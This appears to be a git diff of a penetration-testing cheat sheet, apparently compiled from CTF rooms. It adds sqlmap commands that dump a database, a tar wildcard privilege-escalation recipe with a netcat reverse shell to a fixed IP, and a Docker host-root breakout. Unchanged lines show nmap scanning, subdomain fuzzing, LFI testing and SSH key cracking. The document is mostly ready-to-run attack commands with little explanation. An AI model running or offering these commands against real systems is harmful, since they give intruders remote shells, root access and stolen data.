@@ -12,6 +12,14 @@ sudo nmap -sS -p- -o scan_full.txt 10.10.10.218
 wfuzz -w subdomains-top1million-5000.txt -H "Host: FUZZ.vulnnet.thm" --hc 200 10.10.236.248
 ```
 
+### sqlmap
+```powershell
+sqlmap -r ./test_user --dbms=MySQL --technique=U --delay=3
+sqlmap -r ./test_user --dbms=MySQL --current-db
+sqlmap -r ./test_user --dbms=MySQL -D marketplace --dump
+```
+
+
 ### LFI
 ```powershell
 python ./panoptic.py --url http://vulnnet.thm/\?referer\=test
@@ -44,6 +52,25 @@ python ssh2john.py id_rsa > id_rsa.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
 ```
 
+## Priv Esc
+
+### tar wildcards
+```powershell
+cd target_dir
+echo "mkfifo /tmp/bggenux; nc 10.9.4.192 4444 0</tmp/bggenux | /bin/sh >/tmp/bggenux 2>&1; rm /tmp/bggenux" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+tar cf archive.tar *
+```
+* [https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+* [https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)
+
+
+### Docker
+```powershell
+docker run -it -v /:/host/ <docker image> chroot /host/ bash
+```
+* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
 
 ## Misc
 
@@ -63,8 +90,6 @@ python3 -c'import pty;pty.spawn("/bin/bash")'
 [*] hydra
 [*] http bruteforce
 [*] one line reverse shell
-[*] linepeas
 [*] check linux exploit
 [*] smb (nmap script enum)
 [*] john
-[*] linepeas
